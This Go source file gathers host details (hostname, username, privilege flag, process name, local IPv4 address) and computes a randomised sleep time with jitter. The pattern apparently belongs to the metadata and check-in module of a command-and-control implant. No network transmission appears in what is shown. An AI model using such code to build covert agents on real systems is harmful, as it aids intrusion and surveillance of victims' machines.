package core

import (
	"net"
	"os"
	"os/user"
	"path/filepath"
	"runtime"
	"strings"
	"time"
)

func GetID() int {
	Num := RandomInt(100000000, 2147000000)
	if (Num & 1) == 0 {
		Num += 1
	}
	return Num
}

func GetPID() int {
	return os.Getpid()
}

func GetOEM() int {
	if runtime.GOOS == "windows" {
		return 43011
	}
	return 59901
}

func GetFlag() int {
	Num := 0
	if os.Getuid() == 0 {
		Num += 8
	} else if 32<<(^uint(0)>>63) == 64 {
		Num += 4
	} else if strings.Contains(runtime.GOARCH, "64") {
		Num += 2
	} else {
		Num += 1
	}
	return Num
}

func GetComputer() string {
	Computer, err := os.Hostname()
	if err != nil {
		return "unknown"
	}
	return Computer
}

func GetUserName() string {
	User, err := user.Current()
	if err != nil { return "unknown" }
	if strings.Contains(User.Username, "\\") {
		return strings.SplitN(User.Username, "\\", 2)[1]
	}
	return User.Username
}

func GetProcess() string {
	return filepath.Base(os.Args[0])
}

func GetIPAddress() int {
	Addrs, _ := net.InterfaceAddrs()
	for _, Address := range Addrs {
		IPNet, _ := Address.(*net.IPNet)
		if !IPNet.IP.IsLoopback() && !IPNet.IP.IsLinkLocalUnicast() && IPNet.IP.To4() != nil {
			return _ByteToInt(IPNet.IP.To4())
		}
	}
	return 0
}

func GetWaitTime() time.Duration {
	Min := Sleep - Sleep*Jitter/100
	return time.Duration(RandomInt(Min, Sleep))*time.Millisecond
}